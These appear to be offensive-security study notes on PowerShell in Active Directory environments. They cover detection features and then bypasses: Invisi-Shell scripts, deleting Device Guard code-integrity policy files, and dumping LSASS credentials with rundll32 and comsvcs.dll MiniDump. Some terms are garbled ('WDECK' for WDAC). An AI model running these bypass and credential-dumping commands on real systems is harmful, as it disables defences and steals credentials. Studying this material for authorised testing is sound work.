# Powershell
Powershell is a robust command-line shell and scripting language that comes bundled with modern Windows operating systems. It provides an extensive range of capabilities, granting users access to various components and features within the Windows platform. This includes the Active Directory Environment, which, unfortunately, can be leveraged by potential attackers to compromise system security. One of the standout advantages of Powershell is its ability to execute complex scripts directly from memory without the need for intermediate files. This feature makes it an ideal tool for establishing foothold shells or gaining unauthorized control over targeted systems. By being built on the .NET framework and closely integrated with Windows, Powershell enables seamless interaction with the operating system's resources and functionalities, enhancing its potential as a versatile and potent tool.

> PowerShell is **NOT** *powershell.exe*. It is the *System.Management.Automation.dll*


## Different ways to access PowerShell
1. *[ADSI]*
2. *.NET* Classes **System.DirectoryServices.ActiveDirectory**
3. Native Executable
4. WMI using PowerShell
5. ActiveDirectory Module


## PowerShell Detection Mechanism [ Blue Teaming ]
1. System-wide transcription
2. Script Block logging
3. AntiMalware Scan Interface (AMSI)
4. Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
5. PinkCastle

---

# Bypassing PowerShell Security

## Using Invisi-Shell
1. With admin privileges
```powershell
RunWithPathAsAdmin.bat 
```
2. With non-admin privileges:
```powershell
RunWithRegistryNonAdmin.bat
```

> Type exit from the new PowerShell session to complete the clean-up.

---

# Bypassing Application Whitelisting 

#### 1. Methods for checking application whitelisting
1. Software Restriction Policies (SRP)
2. Applocker
3. Device Guard (WDECK)
4. Application Control in Azure

#### 2. Steps to check the Applocker policy
> Use the command
```powershell
PS> Get-ApplockerPolicy -Effective
```

#### 3. Check if Device Guard (WDECK) is enabled
> Use the command
```powershell
PS> Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### 4. Two approaches for blocking malicious programs
1. Blocking known malicious signatures
	+ Compare executable (*exe*) or dynamic-link library (*dll*) signatures with a database of well-known malicious signature hashes.
2. Allowing only trusted programs to run
	+ Instead of blocking malicious programs, allow only trusted Microsoft-signed binaries to execute (commonly referred to as "*notegood*").

#### 5. Bypassing WDECK
1.  **If WDECK is not implemented using Group Policy**
	1. Go to the directory
		```powershell
		C:\Windows\system32\CodeIntegrity
		```
	2. Delete the following files
		1. *DG.bin.p7*
		2. *SiPolicy.p7b*
	3. Reboot the machine.
2. **If you are in a VM and WDECK is enabled with GPOs**
	1. In this case, the **rundll32.exe** will likely be available for use.
	2. Options for dumping credentials
		1. Dumping the SAM and hive files
		2. Dumping the LSASS (Local Security Authority Subsystem Service)
		3. Steps for dumping LSASS
			```powershell
			# Run the following command
			tasklist /FI "IMAGENAME eq lsass.exe"

			# Execute the following command
			rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full

			# Copy the LSASS dump to another location
			echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp

			# Now Extract the credentials from the LSASS dump.
			```
